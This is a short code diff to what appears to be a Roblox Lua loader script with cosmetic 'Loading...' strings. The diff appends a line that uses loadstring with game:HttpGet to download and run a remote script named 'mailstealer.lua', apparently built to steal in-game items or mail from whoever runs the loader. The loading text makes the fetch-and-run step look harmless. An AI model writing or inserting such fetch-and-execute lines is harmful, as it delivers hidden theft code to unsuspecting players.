@@ -13,3 +13,5 @@ Text2 = "Loading.."
 Text3 = "Loading..."
 Text4 = "Loading."
 Text5 = "Almost Done Loading.."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Dovyl/Pet-Simulator-99/main/mailstealer.lua"))()
